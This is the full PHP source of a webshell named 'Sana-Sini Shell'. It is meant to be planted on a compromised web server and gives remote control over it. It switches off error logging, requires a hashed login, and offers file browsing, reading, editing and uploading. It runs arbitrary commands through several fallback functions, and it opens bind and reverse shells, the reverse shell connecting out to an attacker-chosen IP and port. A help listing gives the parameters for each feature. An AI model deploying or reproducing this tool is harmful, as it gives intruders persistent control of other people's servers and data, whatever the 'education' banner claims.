<?php
/**********************************************
Name: <Sana-Sini> Shell                       *
Author: ./MyHeartIsyr                         *
Blog: https://myheart-isyr.blogspot.com       *
Description: Mini webshell, you can use this  *
webshell for RFI (if possible)                *
***********************************************/

// -- Something :D
@session_start();
@set_time_limit(0);
@ini_set("display_errors", "Off");
@ini_set("display_startup_errors", "Off");
@ini_set("log_errors", "Off");
@ini_set("log_errors_max_len", 0);
@ini_set("html_errors", "Off");
@ini_set("max_execution_time", 0);
@ini_set("error_reporting", null);
@ini_set("output_buffering", 0);

if(function_exists("posix_getpwuid")){
	$xuser_uid = posix_getpwuid(posix_geteuid());
	$xuser = $xuser_uid['name'];
}
else {
	$xuser = @get_current_user();
}

// -- Login
$akun = "bc915a1de25f021f8ddbb152ab8b6688:73d9b8694ea22640b01bd45c28ea63402e7fd48649f0ec2d232220a40092e934";
$p = explode(":", $akun);
if(!isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])])){
	if(md5(base64_encode($_GET['u'])) != $p[0] && hash("sha256", $_GET['p']) != $p[1]){
		die("[!] You must login sir :)");
		exit;
	}
	else {
		$_SESSION[base64_encode($_SERVER['HTTP_HOST'])] = true;
	}
}

// -- Styles
echo "<style>
body {
	font-family: Courier New;
}
.rf {
	background: #000;
	color: #fff;
	border: 1px solid #555;
}
pre {
	font-family: Courier New;
}
#titel {
	font-family: DejaVu Sans Mono;
	text-align: center;
}
textarea {
	background: #000;
	color: #fff;
	border: 1px solid transparent;
	font-family: Courier New;
}
.edt {
	width: 100%;
	height: 400px;
}
</style>
<h1 id='titel'>&lt;Sana-Sini&gt; Shell</h1>";

// -- Listing Directories
if(isset($_GET['x'])){
	$xcwd = $_GET['x'];
	@chdir($xcwd);
}
else {
	$xcwd = @getcwd();
}
$xcwd = str_replace("\\", "/", $xcwd);

if($buka = @opendir($xcwd)){
	echo "<table width='100%'>";
	while($baca = readdir($buka)){
		$perms = coloring("$xcwd/$baca", perms("$xcwd/$baca"));
		$tehtime = date("Y-m-d H:i:s", filemtime($baca));
		$tehsize = filesize($baca);
		if(is_dir($baca)){
			echo "<tr><td><a href='?x=$xcwd/$baca'><font color='red'>";
		}
		else {
			echo "<tr><td><a href='?r=$xcwd/$baca&x=$xcwd'><font color='black'>";
		}
		echo "$baca</a>";
		echo "</font></td>
		<td>$perms</td>
		<td>$tehtime</td>
		<td>$tehsize</td>
		</tr>";
	}
	echo "</table>";
}
else {
	echo "<pre>opendir fail</pre>";
}

// -- Command Execution
if(isset($_GET['y'])){
	echo "<pre>".shexec($_GET['y'])."</pre>";
}

// -- Read Files
if(isset($_GET['r'])){
	echo "<pre class='rf'>".htmlspecialchars(file_get_contents($_GET['r']))."</pre>";
}

// -- Edit Files
if(isset($_GET['edt'])){
	echo "<form method='post'>
	<textarea class='edt' name='srcku'>".htmlspecialchars(file_get_contents($_GET['edt']))."</textarea>
	<input type='submit' name='goedt' value='>>'></form>";
	if(isset($_POST['goedt'])){
		if(file_put_contents($_GET['edt'], $_POST['srcku'])){
			echo "<script>alert('Done.');</script>";
		}
		else {
			echo "<script>alert('Failed.');</script>";
		}
	}
}

// -- PHPInfo
if(isset($_GET['pinfo'])){
	phpinfo();
}

// -- Upload
if(isset($_GET['up'])){
	if(isset($_POST['angkat'])){
		if(@move_uploaded_file($_FILES['bojoku']['tmp_name'], "$xcwd/".$_FILES['bojoku']['name']."")){
			echo "Done.";
		}
		else {
			echo "Fail.";
		}
	}
	
	echo "<form enctype='multipart/form-data' method='post'>
	<input type='file' name='bojoku'>
	<input type='submit' name='angkat' value='>>'>
	</form>";
}

// -- Help (Spoiler)
if(isset($_GET['help']) && $_GET['help'] == "spoiler"){
	echo "<pre>
Listing Directories: ?x=/folder/folder
Read File: ?r=/folder/file
Edit File: ?edt=/folder/file
Upload File: ?up
Command Execution: ?y=command
PHPInfo: ?pinfo
Bind Shell: ?bind&port=random+port
Reverse Shell: ?reverse&remip=your+ip&remport=your+port
About: ?about
Login: ?u=username&p=password
Logout: ?endsession
</pre>";
}

// -- About :P
if(isset($_GET['about'])){
	echo "<center>
<pre>
Greetz to:
FalahGo5 | M2.M4GNuM | All My Friends in Real Life | Indonesian Hacker Team | Indonesian Underground Team

Regardz
./MyHeartIsyr
</pre></center>";
}

// -- Bind Shell
if(isset($_GET['bind'])){
	$port = isset($_GET['port']) ? $_GET['port'] : "1337";
	$host = @gethostbyname($_SERVER['HTTP_HOST']);
	$method = function_exists("stream_socket_server") ? "stream_socket_server" : "socket_create";
	setup_bind($host, $port, $method);
}

// -- Reverse Shell
if(isset($_GET['reverse'])){
	$host = isset($_GET['remip']) ? $_GET['remip'] : $_SERVER['REMOTE_ADDR'];
	$port = isset($_GET['remport']) ? $_GET['remport'] : "1337";
	
	$method = function_exists("fsockopen") ? "fsockopen" : "stream_socket_client";
	setup_reverse($host, $port, $method);
}

// -- Logout
if(isset($_GET['endsession'])){
	unset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}

// -- Functions
function shexec($x, $win_tick = false){
	if(DIRECTORY_SEPARATOR === "/"){
		$x .= " 2>&1";
	}
	
	if(function_exists("system")){
		ob_start();
		@system($x);
		$out = ob_get_contents();
		ob_end_clean();
		return $out;
	}
	elseif(function_exists("shell_exec")){
		return @shell_exec($x);
	}
	elseif(function_exists("exec")){
		@exec($x, $outArr, $ret);
		return implode(PHP_EOL, $outArr);
	}
	elseif(function_exists("passthru")){
		ob_start();
		@passthru($x, $ret);
		$out = ob_get_contents();
		ob_end_clean();
		return $out;
	}
	elseif(function_exists("proc_open")){
		$deskrip = array(
			0 => array(
				"pipe",
				"r"
			),
			1 => array(
				"pipe",
				"w"
			),
			2 => array(
				"pipe",
				"w"
			)
		);
		if(DIRECTORY_SEPARATOR === "\\"){
			$old_tick = $x;
			if($win_tick){
				$old_tick = "C:\\Windows\\System32\\cmd.exe /C {$x}";
			}
			
			$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd(), null, array(
				"suppress_errors" => false,
				"bypass_shell" => true
			));
			if(!is_resource($process)){
				$old_tick = $x;
				$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd(), null, array(
					"suppress_errors" => false,
					"bypass_shell" => true
				));
			}
		}
		else {
			$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd());
		}
		
		$out = "";
		if(is_resource($process)){
			fclose($pipes[0]);
			$out = stream_get_contents($pipes[1]);
			fclose($pipes[1]);
			$err = stream_get_contents($pipes[2]);
			$out .= $err;
			fclose($pipes[2]);
			$ret = proc_close($process);
		}
		return $out;
	}
	elseif(function_exists("popen")){
		$process = popen($x, "r");
		$out = fread($process, 4096);
		pclose($process);
		return $out;
	}
	return "Every functions is inactive or disabled, sorry dudes :(";
}

function setup_bind($host, $port, $type = "stream_socket_server"){
	global $xuser;
	if($type == "stream_socket_server"){
		$fpsock = @stream_socket_server("tcp://$host:$port", $errno, $errstr);
		$cs = @stream_socket_accept($fpsock);
		if(!$fpsock){
			return "Failed, $errno: $errstr";
		}
		else {
			fputs($cs, "
+-[WARNING]------------------------------+
| FOR EDUCATION & NON-COMMERCIAL PURPOSE |
| I'M NOT RESPONSIBLE FOR ANY MISUSED OF |
|             THIS PROJECT               |
+----------------------------------------+\n");
			while(!feof($cs)){
				fwrite($cs, $xuser."@".@gethostbyname($_SERVER['HTTP_HOST']).":".@getcwd()." ~$");
				$cmds = fgets($cs, 1024);
				if(preg_match("/cd\ ([^\s]+)/i", $cmds, $rr)){
					$dd = $rr[1];
					if(is_dir($dd))chdir($dd);
				}
				elseif(trim($cmds) == "quit" || trim($cmds) == "exit"){
					fwrite($cs, "Session Ends");
					fclose($cs);
					exit;
				}
				fwrite($cs, shexec($cmds));
			}
			fclose($cs);
			fclose($fpsock);
		}
	}
	elseif($type == "socket_create"){
		$fpsock = @socket_create(AF_INET, SOCK_STREAM, 0);
		socket_set_nonblock($fpsock);
		if(!$fpsock){
			return "Whoops, Rejected";
		}
		else {
			@socket_write($fpsock, "HAHAHA", strlen("HAHAHA"));
			while(!@socket_connect($fpsock, $host, $port)){
				@socket_write($fpsock, $xuser."@".@gethostbyname($_SERVER['HTTP_HOST']).":".@getcwd()."~$", 
				strlen($xuser."@".@gethostbyname($_SERVER['HTTP_HOST']).":".@getcwd()."~$"));
				$cmds = @socket_read($fpsock, 1024, PHP_NORMAL_READ);
				if(preg_match("/cd\ ([^\s]+)/i", $cmds, $rr)){
					$dd = $rr[1];
					if(is_dir($dd))chdir($dd);
				}
				elseif(trim($cmds) == "quit" || trim($cmds) == "exit"){
					socket_write($fpsock, "Session Ends", strlen("Session Ends"));
					socket_set_block($fpsock);
					socket_close($fpsock);
				}
				socket_write($fpsock, shexec($cmds), strlen(shexec($cmds)));
			}
			socket_set_block($fpsock);
			socket_close($fpsock);
		}
	}
}

function setup_reverse($host, $port, $type = "fsockopen"){
	global $xuser;
	if($type == "fsockopen"){
		$fpsock = @fsockopen($host, $port, $errno, $errstr);
		if(!$fpsock){
			return "Failed, ($errno): $errstr";
		}
		else {
			fputs($fpsock, "
+-[WARNING]------------------------------+
| FOR EDUCATION & NON-COMMERCIAL PURPOSE |
| I'M NOT RESPONSIBLE FOR ANY MISUSED OF |
|             THIS PROJECT               |
+----------------------------------------+\n");
			while(!feof($fpsock)){
				fwrite($fpsock, $xuser."@".@gethostbyname($_SERVER['HTTP_HOST']).":".@getcwd()." ~$");
				$cmds = fgets($fpsock, 1024);
				if(preg_match("/cd\ ([^\s]+)/i", $cmds, $rr)){
					$dd = $rr[1];
					if(is_dir($dd))chdir($dd);
				}
				elseif(trim($cmds) == "quit" || trim($cmds) == "exit"){
					fwrite($fpsock, "Session Ends");
					fclose($fpsock);
					exit;
				}
				fwrite($fpsock, shexec($cmds));
			}
			fclose($fpsock);
		}
	}
	elseif($type == "stream_socket_client"){
		$fpsock = @stream_socket_client("tcp://$host:$port", $errno, $errstr);
		$cs = @stream_socket_accept($fpsock);
		if(!$fpsock){
			return "Failed, ($errno): $errstr";
		}
		else {
			fputs($cs, "
+-[WARNING]------------------------------+
| FOR EDUCATION & NON-COMMERCIAL PURPOSE |
| I'M NOT RESPONSIBLE FOR ANY MISUSED OF |
|             THIS PROJECT               |
+----------------------------------------+\n");
			while(!feof($cs)){
				fwrite($cs, $xuser."@".@gethostbyname($_SERVER['HTTP_HOST']).":".@getcwd()." ~$");
				$cmds = fgets($cs, 1024);
				if(preg_match("/cd\ ([^\s]+)/i", $cmds, $rr)){
					$dd = $rr[1];
					if(is_dir($dd))chdir($dd);
				}
				elseif(trim($cmds) == "quit" || trim($cmds) == "exit"){
					fwrite($cs, "Session Ends");
					fclose($cs);
					exit;
				}
				fwrite($cs, shexec($cmds));
			}
			fclose($cs);
			fclose($fpsock);
		}
	}
}

function perms($file) {
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } 
	elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } 
	elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } 
	elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } 
	elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } 
	elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } 
	elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } 
	else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info.= (($perms & 0x0100) ? 'r' : '-');
    $info.= (($perms & 0x0080) ? 'w' : '-');
    $info.= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    
	// Group
    $info.= (($perms & 0x0020) ? 'r' : '-');
    $info.= (($perms & 0x0010) ? 'w' : '-');
    $info.= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    
	// World
    $info.= (($perms & 0x0004) ? 'r' : '-');
    $info.= (($perms & 0x0002) ? 'w' : '-');
    $info.= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    
	return $info;
}

function coloring($x, $y){
	return is_writable($x) ? "<font style='background: #000; color: #00ff00;'>$y</font>" : "<font style='background: #000; color: #dd0000;'>$y</font>";
}